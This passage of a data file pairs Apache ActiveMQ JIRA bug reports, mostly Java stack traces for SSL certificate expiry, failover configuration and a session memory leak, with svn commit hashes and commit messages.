	at junit.framework.TestSuite.run(TestSuite.java:203)
	at org.apache.tools.ant.taskdefs.optional.junit.JUnitTestRunner.run(JUnitTestRunner.java:325)
	at org.apache.tools.ant.taskdefs.optional.junit.JUnitTestRunner.main(JUnitTestRunner.java:536)
Caused by: java.net.SocketException: Socket is closed
	at java.net.Socket.getSoTimeout(Socket.java:964)
	at com.ibm.sslite.be.getSoTimeout(Unknown Source)
	at com.ibm.sslite.be.a(Unknown Source)
	at com.ibm.sslite.be.<init>(Unknown Source)
	at com.ibm.jsse.bv.a(Unknown Source)
	at com.ibm.jsse.b.a(Unknown Source)
	at com.ibm.jsse.b.write(Unknown Source)
	at org.activemq.transport.tcp.TcpBufferedOutputStream.flush(TcpBufferedOutputStream.java:109)
	at java.io.DataOutputStream.flush(DataOutputStream.java:126)
	at org.activemq.transport.tcp.TcpTransportChannel.doAsyncSend(TcpTransportChannel.java:475)
	... 18 more
javax.net.ssl.SSLHandshakeException: certificate expired
	at com.ibm.jsse.bv.a(Unknown Source)
	at com.ibm.jsse.a.a(Unknown Source)
	at com.ibm.jsse.a.read(Unknown Source)
	at java.io.BufferedInputStream.fill(BufferedInputStream.java:200)
	at java.io.BufferedInputStream.read(BufferedInputStream.java:218)
	at java.io.DataInputStream.readByte(DataInputStream.java:358)
	at org.activemq.io.AbstractWireFormat.readPacket(AbstractWireFormat.java:230)
	at org.activemq.transport.tcp.TcpTransportChannel.run(TcpTransportChannel.java:313)
	at java.lang.Thread.run(Thread.java:570)
java.net.SocketException: Socket is closed
	at java.net.Socket.getSoTimeout(Socket.java:964)
	at com.ibm.sslite.be.getSoTimeout(Unknown Source)
	at com.ibm.sslite.be.a(Unknown Source)
	at com.ibm.sslite.be.<init>(Unknown Source)
	at com.ibm.jsse.bv.a(Unknown Source)
	at com.ibm.jsse.b.a(Unknown Source)
	at com.ibm.jsse.b.write(Unknown Source)
	at org.activemq.transport.tcp.TcpBufferedOutputStream.flush(TcpBufferedOutputStream.java:109)
	at java.io.DataOutputStream.flush(DataOutputStream.java:126)
	at org.activemq.transport.tcp.TcpTransportChannel.doAsyncSend(TcpTransportChannel.java:475)
	at org.activemq.transport.TransportChannelSupport.asyncSendWithReceipt(TransportChannelSupport.java:160)
	at org.activemq.transport.TransportChannelSupport.send(TransportChannelSupport.java:145)
	at org.activemq.transport.TransportChannelTestSupport.testRpc(TransportChannelTestSupport.java:106)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:85)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:58)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:60)
	at java.lang.reflect.Method.invoke(Method.java:391)
	at junit.framework.TestCase.runTest(TestCase.java:154)
	at junit.framework.TestCase.runBare(TestCase.java:127)
	at junit.framework.TestResult$1.protect(TestResult.java:106)
	at junit.framework.TestResult.runProtected(TestResult.java:124)
	at junit.framework.TestResult.run(TestResult.java:109)
	at junit.framework.TestCase.run(TestCase.java:118)
	at junit.framework.TestSuite.runTest(TestSuite.java:208)
	at junit.framework.TestSuite.run(TestSuite.java:203)
	at org.apache.tools.ant.taskdefs.optional.junit.JUnitTestRunner.run(JUnitTestRunner.java:325)
	at org.apache.tools.ant.taskdefs.optional.junit.JUnitTestRunner.main(JUnitTestRunner.java:536)
Sender got an exception:
Failure starting receiver: 
javax.jms.JMSException: Error reading socket: javax.net.ssl.SSLHandshakeException: certificate expired
	at org.activemq.util.JMSExceptionHelper.newJMSException(JMSExceptionHelper.java:49)
	at org.activemq.transport.tcp.TcpTransportChannel.doClose(TcpTransportChannel.java:513)
	at org.activemq.transport.tcp.TcpTransportChannel.run(TcpTransportChannel.java:330)
	at java.lang.Thread.run(Thread.java:570)
Caused by: javax.net.ssl.SSLHandshakeException: certificate expired
	at com.ibm.jsse.bv.a(Unknown Source)
	at com.ibm.jsse.a.a(Unknown Source)
	at com.ibm.jsse.a.read(Unknown Source)
	at java.io.BufferedInputStream.fill(BufferedInputStream.java:200)
	at java.io.BufferedInputStream.read(BufferedInputStream.java:218)
	at java.io.DataInputStream.readByte(DataInputStream.java:358)
	at org.activemq.io.AbstractWireFormat.readPacket(AbstractWireFormat.java:230)
	at org.activemq.transport.tcp.TcpTransportChannel.run(TcpTransportChannel.java:313)
	... 1 more
javax.jms.JMSException: start failed: certificate expired
	at org.activemq.transport.tcp.TcpTransportChannel.start(TcpTransportChannel.java:199)
	at org.activemq.transport.TransportChannelTestSupport.configureReceiver(TransportChannelTestSupport.java:285)
	at org.activemq.transport.TransportChannelTestSupport.addClient(TransportChannelTestSupport.java:331)
	at org.activemq.transport.TransportServerChannelSupport.addClient(TransportServerChannelSupport.java:98)
	at org.activemq.transport.tcp.TcpTransportServerChannel.run(TcpTransportServerChannel.java:158)
	at java.lang.Thread.run(Thread.java:570)
Caused by: javax.net.ssl.SSLHandshakeException: certificate expired
	at com.ibm.jsse.bv.a(Unknown Source)
	at com.ibm.jsse.a.a(Unknown Source)
	at com.ibm.jsse.a.read(Unknown Source)
	at java.io.BufferedInputStream.fill(BufferedInputStream.java:200)
	at java.io.BufferedInputStream.read(BufferedInputStream.java:218)
	at java.io.FilterInputStream.read(FilterInputStream.java:86)
	at org.activemq.io.WireFormatLoader.getWireFormat(WireFormatLoader.java:67)
	at org.activemq.transport.tcp.TcpTransportChannel.readWireFormat(TcpTransportChannel.java:208)
	at org.activemq.transport.tcp.TcpTransportChannel.start(TcpTransportChannel.java:178)
	... 5 more
javax.net.ssl.SSLHandshakeException: certificate expired
	at com.ibm.jsse.bv.a(Unknown Source)
	at com.ibm.jsse.a.a(Unknown Source)
	at com.ibm.jsse.a.read(Unknown Source)
	at java.io.BufferedInputStream.fill(BufferedInputStream.java:200)
	at java.io.BufferedInputStream.read(BufferedInputStream.java:218)
	at java.io.DataInputStream.readByte(DataInputStream.java:358)
	at org.activemq.io.AbstractWireFormat.readPacket(AbstractWireFormat.java:230)
	at org.activemq.transport.tcp.TcpTransportChannel.run(TcpTransportChannel.java:313)
	at java.lang.Thread.run(Thread.java:570)
javax.net.ssl.SSLHandshakeException: certificate expired
	at com.ibm.jsse.bv.a(Unknown Source)
	at com.ibm.jsse.a.a(Unknown Source)
	at com.ibm.jsse.a.read(Unknown Source)
	at java.io.BufferedInputStream.fill(BufferedInputStream.java:200)
	at java.io.BufferedInputStream.read(BufferedInputStream.java:218)
	at java.io.FilterInputStream.read(FilterInputStream.java:86)
	at org.activemq.io.WireFormatLoader.getWireFormat(WireFormatLoader.java:67)
	at org.activemq.transport.tcp.TcpTransportChannel.readWireFormat(TcpTransportChannel.java:208)
	at org.activemq.transport.tcp.TcpTransportChannel.start(TcpTransportChannel.java:178)
	at org.activemq.transport.TransportChannelTestSupport.configureReceiver(TransportChannelTestSupport.java:285)
	at org.activemq.transport.TransportChannelTestSupport.addClient(TransportChannelTestSupport.java:331)
	at org.activemq.transport.TransportServerChannelSupport.addClient(TransportServerChannelSupport.java:98)
	at org.activemq.transport.tcp.TcpTransportServerChannel.run(TcpTransportServerChannel.java:158)
	at java.lang.Thread.run(Thread.java:570)
------------- ---------------- ---------------
Testcase: testSendPacket(org.activemq.transport.ssl.SslTransportChannelTest):	FAILED
Exceptions were thrown: [javax.jms.JMSException: start failed: certificate expired, javax.jms.JMSException: Error reading socket: javax.net.ssl.SSLHandshakeException: certificate expired]
junit.framework.AssertionFailedError: Exceptions were thrown: [javax.jms.JMSException: start failed: certificate expired, javax.jms.JMSException: Error reading socket: javax.net.ssl.SSLHandshakeException: certificate expired]
	at org.activemq.transport.TransportChannelTestSupport.tearDown(TransportChannelTestSupport.java:254)


Testcase: testAsyncSendWithReceipt(org.activemq.transport.ssl.SslTransportChannelTest):	FAILED
Exceptions were thrown: [javax.jms.JMSException: Error reading socket: javax.net.ssl.SSLHandshakeException: certificate expired, javax.jms.JMSException: start failed: certificate expired]
junit.framework.AssertionFailedError: Exceptions were thrown: [javax.jms.JMSException: Error reading socket: javax.net.ssl.SSLHandshakeException: certificate expired, javax.jms.JMSException: start failed: certificate expired]
	at org.activemq.transport.TransportChannelTestSupport.tearDown(TransportChannelTestSupport.java:254)


Testcase: testRpc(org.activemq.transport.ssl.SslTransportChannelTest):	FAILED
Exceptions were thrown: [javax.jms.JMSException: start failed: certificate expired, javax.jms.JMSException: Error reading socket: javax.net.ssl.SSLHandshakeException: certificate expired, javax.jms.JMSException: asyncSend failed: java.net.SocketException: Socket is closed]
junit.framework.AssertionFailedError: Exceptions were thrown: [javax.jms.JMSException: start failed: certificate expired, javax.jms.JMSException: Error reading socket: javax.net.ssl.SSLHandshakeException: certificate expired, javax.jms.JMSException: asyncSend failed: java.net.SocketException: Socket is closed]
	at org.activemq.transport.TransportChannelTestSupport.tearDown(TransportChannelTestSupport.java:254)


Testcase: testForceDisconnect(org.activemq.transport.ssl.SslTransportChannelTest):	FAILED
Exceptions were thrown: [javax.jms.JMSException: Error reading socket: javax.net.ssl.SSLHandshakeException: certificate expired, javax.jms.JMSException: start failed: certificate expired]
junit.framework.AssertionFailedError: Exceptions were thrown: [javax.jms.JMSException: Error reading socket: javax.net.ssl.SSLHandshakeException: certificate expired, javax.jms.JMSException: start failed: certificate expired]
	at org.activemq.transport.TransportChannelTestSupport.tearDown(TransportChannelTestSupport.java:254)


",76963e6adfdae0c74ebbb1150018067104b7d70e,"some work for: https://issues.apache.org/jira/browse/AMQ-4172

Adds activemq-spring into the rar.

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1418364 13f79535-47bb-0310-9956-ffa450edef68"
12481368,AMQ-416,"If  the failover protocol is specified in a <networkConnector> element, the broker will not complete startup from a script.

Example using the following uri:

<networkConnector uri=""failover://(tcp://localhost:62626)""/>

generates the following exception:

Exception in thread ""main"" org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'org.activemq.network.NetworkConnector' defined in class path resource [activemq.xml]: Error setting property values; nested exception is org.springframework.beans.PropertyAccessExceptionsException: PropertyAccessExceptionsException (1 errors); nested propertyAccessExceptions are: [org.springframework.beans.MethodInvocationException: Property 'uri' threw exception; nested exception is java.io.IOException: Could not create discovery agent: failover://(tcp://localhost:62626)]
PropertyAccessExceptionsException (1 errors)
org.springframework.beans.MethodInvocationException: Property 'uri' threw exception; nested exception is java.io.IOException: Could not create discovery agent: failover://(tcp://localhost:62626)
java.io.IOException: Could not create discovery agent: failover://(tcp://localhost:62626)
	at org.activemq.util.IOExceptionSupport.create(IOExceptionSupport.java:26)
	at org.activemq.transport.discovery.DiscoveryAgentFactory.createDiscoveryAgent(DiscoveryAgentFactory.java:56)
	at org.activemq.network.NetworkConnector.setUri(NetworkConnector.java:166)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
	at java.lang.reflect.Method.invoke(Method.java:585)
	at org.springframework.beans.BeanWrapperImpl.setPropertyValue(BeanWrapperImpl.java:860)
	at org.springframework.beans.BeanWrapperImpl.setPropertyValue(BeanWrapperImpl.java:733)
	at org.springframework.beans.BeanWrapperImpl.setPropertyValue(BeanWrapperImpl.java:890)
	at org.springframework.beans.BeanWrapperImpl.setPropertyValues(BeanWrapperImpl.java:917)
	at org.springframework.beans.BeanWrapperImpl.setPropertyValues(BeanWrapperImpl.java:906)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.applyPropertyValues(AbstractAutowireCapableBeanFactory.java:1022)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.populateBean(AbstractAutowireCapableBeanFactory.java:823)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:345)
	at org.springframework.beans.factory.support.BeanDefinitionValueResolver.resolveInnerBeanDefinition(BeanDefinitionValueResolver.java:147)
	at org.springframework.beans.factory.support.BeanDefinitionValueResolver.resolveValueIfNecessary(BeanDefinitionValueResolver.java:96)
	at org.springframework.beans.factory.support.BeanDefinitionValueResolver.resolveManagedList(BeanDefinitionValueResolver.java:193)
	at org.springframework.beans.factory.support.BeanDefinitionValueResolver.resolveValueIfNecessary(BeanDefinitionValueResolver.java:109)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.applyPropertyValues(AbstractAutowireCapableBeanFactory.java:1012)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.populateBean(AbstractAutowireCapableBeanFactory.java:823)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:345)
	at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:226)
	at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:147)
	at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:275)
	at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:318)
	at org.xbean.spring.context.ClassPathXmlApplicationContext.<init>(ClassPathXmlApplicationContext.java:158)
	at org.xbean.spring.context.ClassPathXmlApplicationContext.<init>(ClassPathXmlApplicationContext.java:48)
	at org.activemq.xbean.XBeanBrokerFactory.createBroker(XBeanBrokerFactory.java:42)
	at org.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:57)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
	at java.lang.reflect.Method.invoke(Method.java:585)
	at org.activemq.broker.Main.run(Main.java:217)
	at org.activemq.broker.Main.main(Main.java:118)
Caused by: java.io.IOException: Could not find factory class for resource: META-INF/services/org/activemq/transport/discoveryagent/failover
	at org.activeio.FactoryFinder.doFindFactoryProperies(FactoryFinder.java:74)
	at org.activeio.FactoryFinder.newInstance(FactoryFinder.java:44)
	at org.activeio.FactoryFinder.newInstance(FactoryFinder.java:33)
	at org.activemq.transport.discovery.DiscoveryAgentFactory.createDiscoveryAgent(DiscoveryAgentFactory.java:47)
	... 34 more




",7410257c2fe862ab38f662bf75ea27c53420a5ac,"https://issues.apache.org/jira/browse/AMQ-4162 - visibility on destination query string options, destinationView.options - useful for user metadata about the destination

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1406210 13f79535-47bb-0310-9956-ffa450edef68"
12481337,AMQ-414,"I raised a Geronimo issue last week -- http://issues.apache.org/jira/browse/GERONIMO-1155. I also posted a patch. I'll repost, here...

While running a test of the DayTrader sample application, the server received an OutOfMemoryException. At the time of failure, there were over 150,000 ActiveMQSession objects. These sessions were being kept alive by ActiveMQ TransactionContexts associated with ActiveMQManagedConnections. I believe that Sessions are being registered with the ActiveMQManagedConnection TransactionContexts, but will never be unregistered via TransactionContext.removeSession(Session).

In non-managed environments, the TransactionContext is owned by the Session. So, a Session does not need to be explicitly removed from the TransactionContext. Once a Session has been closed, both the Session and the TransactionContext are available for garbage collection. The Session never bothers to ""unregister"" with its associated TransactionContext. IMO, this is the root of the problem. There's a different TransactionContexts structure in RA environments.

ManagedConnections have an additional TransactionContext. As Sessions are created, an RATransactionContext is generated for each new Session. As a Session registers with the RATransactionContext, the RATransactionContext locally registers the Session, but also registers the Session with the ManagedConnection's TransactionContext. It's this registration that is the problem... The Session will never be removed from the ManagedConnection's TransactionContext.

DayTrader repeatedly drives an EJB to publish a message. The processing in the EJB is pretty simple, create a connection from a ConnectionFactory, create a session, create a producer, and send a message. .createConnection(), connection.createSession(), session.createProducer, connection.close(). The ManagedConnection is pooled. So, the connection (and its TransactionContext) are long-lived. Each iteration through the EJB is going to cause the creation of a new Session which is registered with the ManagedConnection's TransactionContext. However, the Session will never be removed from this TransactionContext...

I could create the same basic problem by creating a Connection, and repeatedly creating a session and closing it. 

The above is from my reading of the code. I'm not currently able to run DayTrader in my dev environment. Should be easy to create a simple test-case, but I haven't gotten around to it, yet. 

The obvious fix is to add the following to ActiveMQSession.doClose():

    this.transactionContext.removeSession(this);

I'll post a patch. Let me know if I'm missing something obvious... ",f6a5c7bd470ef4b10aaf6cd43f3bec9760f5a4b2,"apply patch for: https://issues.apache.org/jira/browse/AMQ-4140

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1404116 13f79535-47bb-0310-9956-ffa450edef68"
12481337,AMQ-414,"I raised a Geronimo issue last week -- http://issues.apache.org/jira/browse/GERONIMO-1155. I also posted a patch. I'll repost, here...

While running a test of the DayTrader sample application, the server received an OutOfMemoryException. At the time of failure, there were over 150,000 ActiveMQSession objects. These sessions were being kept alive by ActiveMQ TransactionContexts associated with ActiveMQManagedConnections. I believe that Sessions are being registered with the ActiveMQManagedConnection TransactionContexts, but will never be unregistered via TransactionContext.removeSession(Session).

In non-managed environments, the TransactionContext is owned by the Session. So, a Session does not need to be explicitly removed from the TransactionContext. Once a Session has been closed, both the Session and the TransactionContext are available for garbage collection. The Session never bothers to ""unregister"" with its associated TransactionContext. IMO, this is the root of the problem. There's a different TransactionContexts structure in RA environments.

ManagedConnections have an additional TransactionContext. As Sessions are created, an RATransactionContext is generated for each new Session. As a Session registers with the RATransactionContext, the RATransactionContext locally registers the Session, but also registers the Session with the ManagedConnection's TransactionContext. It's this registration that is the problem... The Session will never be removed from the ManagedConnection's TransactionContext.

DayTrader repeatedly drives an EJB to publish a message. The processing in the EJB is pretty simple, create a connection from a ConnectionFactory, create a session, create a producer, and send a message. .createConnection(), connection.createSession(), session.createProducer, connection.close(). The ManagedConnection is pooled. So, the connection (and its TransactionContext) are long-lived. Each iteration through the EJB is going to cause the creation of a new Session which is registered with the ManagedConnection's TransactionContext. However, the Session will never be removed from this TransactionContext...

I could create the same basic problem by creating a Connection, and repeatedly creating a session and closing it. 

The above is from my reading of the code. I'm not currently able to run DayTrader in my dev environment. Should be easy to create a simple test-case, but I haven't gotten around to it, yet. 

The obvious fix is to add the following to ActiveMQSession.doClose():

    this.transactionContext.removeSession(this);

I'll post a patch. Let me know if I'm missing something obvious... ",f7c799309dd0cac696b966aac2ab4e2a122da1b3,"https://issues.apache.org/jira/browse/AMQ-4145 IntrospectionSupport does not convert from primitive to Wrapper classes appropriately

Added two tests to show the conversion was not happening properly, and added an identity converter to the TypeConversionSupport to do a pass-through conversion on types that are the same after a primitive to wrapper class conversion

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1404165 13f79535-47bb-0310-9956-ffa450edef68"
12481337,AMQ-414,"I raised a Geronimo issue last week -- http://issues.apache.org/jira/browse/GERONIMO-1155. I also posted a patch. I'll repost, here...

While running a test of the DayTrader sample application, the server received an OutOfMemoryException. At the time of failure, there were over 150,000 ActiveMQSession objects. These sessions were being kept alive by ActiveMQ TransactionContexts associated with ActiveMQManagedConnections. I believe that Sessions are being registered with the ActiveMQManagedConnection TransactionContexts, but will never be unregistered via TransactionContext.removeSession(Session).

In non-managed environments, the TransactionContext is owned by the Session. So, a Session does not need to be explicitly removed from the TransactionContext. Once a Session has been closed, both the Session and the TransactionContext are available for garbage collection. The Session never bothers to ""unregister"" with its associated TransactionContext. IMO, this is the root of the problem. There's a different TransactionContexts structure in RA environments.

ManagedConnections have an additional TransactionContext. As Sessions are created, an RATransactionContext is generated for each new Session. As a Session registers with the RATransactionContext, the RATransactionContext locally registers the Session, but also registers the Session with the ManagedConnection's TransactionContext. It's this registration that is the problem... The Session will never be removed from the ManagedConnection's TransactionContext.

DayTrader repeatedly drives an EJB to publish a message. The processing in the EJB is pretty simple, create a connection from a ConnectionFactory, create a session, create a producer, and send a message. .createConnection(), connection.createSession(), session.createProducer, connection.close(). The ManagedConnection is pooled. So, the connection (and its TransactionContext) are long-lived. Each iteration through the EJB is going to cause the creation of a new Session which is registered with the ManagedConnection's TransactionContext. However, the Session will never be removed from this TransactionContext...

I could create the same basic problem by creating a Connection, and repeatedly creating a session and closing it. 

The above is from my reading of the code. I'm not currently able to run DayTrader in my dev environment. Should be easy to create a simple test-case, but I haven't gotten around to it, yet. 

The obvious fix is to add the following to ActiveMQSession.doClose():

    this.transactionContext.removeSession(this);

I'll post a patch. Let me know if I'm missing something obvious... ",972176ea332be5da2f8af1c16eff84fe411e087d,"Add a fix for: https://issues.apache.org/jira/browse/AMQ-4147

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1441240 13f79535-47bb-0310-9956-ffa450edef68"
12481432,AMQ-412,"11:03:12 WARN  stop dispatching
java.lang.NullPointerException
        at java.util.Hashtable.putAll(Hashtable.java:467)
        at org.activemq.transport.stomp.FrameBuilder.addHeaders(FrameBuilder.jav                                                a:56)
        at org.activemq.transport.stomp.Subscription.receive(Subscription.java:6                                                1)
        at org.activemq.transport.stomp.StompWireFormat.writePacket(StompWireFor                                                mat.java:121)
        at org.activemq.transport.tcp.TcpTransportChannel.doAsyncSend(TcpTranspo                                                rtChannel.java:474)
        at org.activemq.transport.tcp.TcpTransportChannel.asyncSend(TcpTransport                                                Channel.java:290)
        at org.activemq.broker.impl.BrokerClientImpl.send(BrokerClientImpl.java:                                                689)
        at org.activemq.broker.impl.BrokerClientImpl.dispatchToClient(BrokerClie                                                ntImpl.java:221)
        at org.activemq.broker.impl.BrokerClientImpl.dispatch(BrokerClientImpl.j                                                ava:166)
        at org.activemq.service.boundedvm.DurableQueueSubscription.doDispatch(Du                                                rableQueueSubscription.java:93)
        at org.activemq.service.boundedvm.DurableQueueBoundedMessageContainer.ru                                                n(DurableQueueBoundedMessageContainer.java:337)
        at EDU.oswego.cs.dl.util.concurrent.PooledExecutor$Worker.run(Unknown So                                                urce)
        at java.lang.Thread.run(Thread.java:595)",1898869fbcacfa343d50a4a786857b7498093986,"apply patch for: https://issues.apache.org/jira/browse/AMQ-4121

Allows for more user customization of MemoryUsage if desired.  

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1434849 13f79535-47bb-0310-9956-ffa450edef68"
12481432,AMQ-412,"11:03:12 WARN  stop dispatching
java.lang.NullPointerException
        at java.util.Hashtable.putAll(Hashtable.java:467)
        at org.activemq.transport.stomp.FrameBuilder.addHeaders(FrameBuilder.jav                                                a:56)
        at org.activemq.transport.stomp.Subscription.receive(Subscription.java:6                                                1)
        at org.activemq.transport.stomp.StompWireFormat.writePacket(StompWireFor                                                mat.java:121)
        at org.activemq.transport.tcp.TcpTransportChannel.doAsyncSend(TcpTranspo                                                rtChannel.java:474)
        at org.activemq.transport.tcp.TcpTransportChannel.asyncSend(TcpTransport                                                Channel.java:290)
        at org.activemq.broker.impl.BrokerClientImpl.send(BrokerClientImpl.java:                                                689)
        at org.activemq.broker.impl.BrokerClientImpl.dispatchToClient(BrokerClie                                                ntImpl.java:221)
        at org.activemq.broker.impl.BrokerClientImpl.dispatch(BrokerClientImpl.j                                                ava:166)
        at org.activemq.service.boundedvm.DurableQueueSubscription.doDispatch(Du                                                rableQueueSubscription.java:93)
        at org.activemq.service.boundedvm.DurableQueueBoundedMessageContainer.ru                                                n(DurableQueueBoundedMessageContainer.java:337)
        at EDU.oswego.cs.dl.util.concurrent.PooledExecutor$Worker.run(Unknown So                                                urce)
        at java.lang.Thread.run(Thread.java:595)",ef1d254e34a5f32f9f46161bf45020c48f555cdd,"AMQ-4122 - add log warning if lease will expire due to mal configuration

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1450213 13f79535-47bb-0310-9956-ffa450edef68"
12481555,AMQ-408,"*configure the broker to have one persistence that is a datasource which is pointing to mysql.
*do not put in the journal persistence.
*making a 500 connections and kill the client VM.
*continue the above step and you will see activemq build up memory.",9583d9af9f5fab8d0dbc1d78c68cc93e01d0e8b0,"AMQ-4081: favicon should be handled as binary file in assembly

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1390323 13f79535-47bb-0310-9956-ffa450edef68"
12481555,AMQ-408,"*configure the broker to have one persistence that is a datasource which is pointing to mysql.
*do not put in the journal persistence.
*making a 500 connections and kill the client VM.
*continue the above step and you will see activemq build up memory.",2537266740452dbf85454c4f6236569be9231cdc,[AMQ-4082] - ensure masked exception is report in the log on missing broker info from local or remote transports
12481645,AMQ-403,JMS client was Connected but not recive message and I query the database that it has data.,6b44c3c9d1fdea972c97c7b874ee0f70eb94bd97,"disable jmx b/c we can't ensure the rmi server port is available - see http://svn.apache.org/viewvc?view=revision&revision=1382852 which removed the socket factory that set setReuseAddress - https://issues.apache.org/jira/browse/AMQ-4033

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1401661 13f79535-47bb-0310-9956-ffa450edef68"
12481645,AMQ-403,JMS client was Connected but not recive message and I query the database that it has data.,f0fce84c02036c3386878792df2a9e8fd8f34c86,"https://issues.apache.org/jira/browse/AMQ-4034 - moving service factory to activemq-osgi module

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1436832 13f79535-47bb-0310-9956-ffa450edef68"
12481645,AMQ-403,JMS client was Connected but not recive message and I query the database that it has data.,6028ec4d3589bc4440c2a5a81704855c2d7c9a4c,"https://issues.apache.org/jira/browse/AMQ-4034 - osgi, add default configurations

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1441501 13f79535-47bb-0310-9956-ffa450edef68"
12481528,AMQ-402,"I am waiting for one hour to recive message,but can't recive message.

How to set journal size in conf file?",446cb26e38c6bcb88806405387c0e67759d19df1,"https://issues.apache.org/jira/browse/AMQ-4020 https://issues.apache.org/jira/browse/AMQ-4021 - disable this test till we deal with propagating store exceptions in place of ioexceptions which result in the transport abort and deal with more exact exception reporting from jdbc transaction context, ie from close/commit processing

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1381161 13f79535-47bb-0310-9956-ffa450edef68"
12481528,AMQ-402,"I am waiting for one hour to recive message,but can't recive message.

How to set journal size in conf file?",f4de9a66ae9de165f27dd2aa5803b536e88db6d8,"https://issues.apache.org/jira/browse/AMQ-4028 - missed adding files in the previous commit

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1381896 13f79535-47bb-0310-9956-ffa450edef68"
12481528,AMQ-402,"I am waiting for one hour to recive message,but can't recive message.

How to set journal size in conf file?",0f9647c1f820da140bed490fd3cebf2aebd5f3f5,"https://issues.apache.org/jira/browse/AMQ-4028 - ws transport test - disconnect client when finished

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1388056 13f79535-47bb-0310-9956-ffa450edef68"
12481431,AMQ-401,"When I use derbydb and hsqldb to store data.I always send data and not recive data.
Then will report memory limit,and then I close activeMq,and then run activeMQ,then will recover data.

But,when activeMQ print Start recover data,it will stop.I have wait 2 hours and repleace other database.Always stop.
",f2225c2f125fa178f1fc998ad52781ae6e156289,"AMQ-4015: Added uptime to broker service, and shown in JMX, as well in logs when stopping broker.

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1383327 13f79535-47bb-0310-9956-ffa450edef68"
12482167,AMQ-400,"When I turn on DEBUG view in logging, I notice the following exception:

DEBUG org.activemq.spring.ActiveMQDtdResolver: Trying to locate [http://activemq.org/dtd/3.2/activemq.dtd]
java.io.FileNotFoundException: http://activemq.org/dtd/3.2/activemq.dtd
	at sun.net.www.protocol.http.HttpURLConnection.getInputStream(Unknown Source)
	at java.net.URL.openStream(Unknown Source)
	at org.activemq.spring.ActiveMQDtdResolver.resolveRemotely(ActiveMQDtdResolver.java:82)
	at org.activemq.spring.ActiveMQDtdResolver.resolveEntity(ActiveMQDtdResolver.java:59)
	at org.apache.xerces.util.EntityResolverWrapper.resolveEntity(Unknown Source)
	at org.apache.xerces.impl.XMLEntityManager.resolveEntity(Unknown Source)
	at org.apache.xerces.impl.XMLDocumentScannerImpl$DTDDispatcher.dispatch(Unknown Source)
	at org.apache.xerces.impl.XMLDocumentFragmentScannerImpl.scanDocument(Unknown Source)
	at org.apache.xerces.parsers.XML11Configuration.parse(Unknown Source)
	at org.apache.xerces.parsers.XML11Configuration.parse(Unknown Source)
	at org.apache.xerces.parsers.XMLParser.parse(Unknown Source)
	at org.apache.xerces.parsers.DOMParser.parse(Unknown Source)
	at org.apache.xerces.jaxp.DocumentBuilderImpl.parse(Unknown Source)
	at javax.xml.parsers.DocumentBuilder.parse(Unknown Source)
	at org.springframework.beans.factory.xml.XmlBeanDefinitionReader.loadBeanDefinitions(XmlBeanDefinitionReader.java:145)
	at org.activemq.spring.ActiveMQBeanFactory.<init>(ActiveMQBeanFactory.java:86)
	at org.activemq.spring.ActiveMQBeanFactory.<init>(ActiveMQBeanFactory.java:57)
	at org.activemq.spring.SpringBrokerContainerFactory.createBrokerContainer(SpringBrokerContainerFactory.java:86)
	at org.activemq.broker.BrokerContext.getBrokerContainerByName(BrokerContext.java:50)
	at org.activemq.ActiveMQConnectionFactory.getContainer(ActiveMQConnectionFactory.java:838)
	at org.activemq.ActiveMQConnectionFactory.createBrokerConnector(ActiveMQConnectionFactory.java:845)
	at org.activemq.ActiveMQConnectionFactory.createTransportChannel(ActiveMQConnectionFactory.java:815)
	at org.activemq.ActiveMQConnectionFactory.createConnection(ActiveMQConnectionFactory.java:608)
	at org.activemq.ActiveMQConnectionFactory.createConnection(ActiveMQConnectionFactory.java:598)
	at org.mule.providers.jms.Jms11Support.createConnection(Jms11Support.java:68)
	at org.mule.providers.jms.JmsConnector.createConnection(JmsConnector.java:203)
	at org.mule.providers.jms.JmsConnector.doConnect(JmsConnector.java:216)
	at org.mule.providers.AbstractConnector.connect(AbstractConnector.java:757)
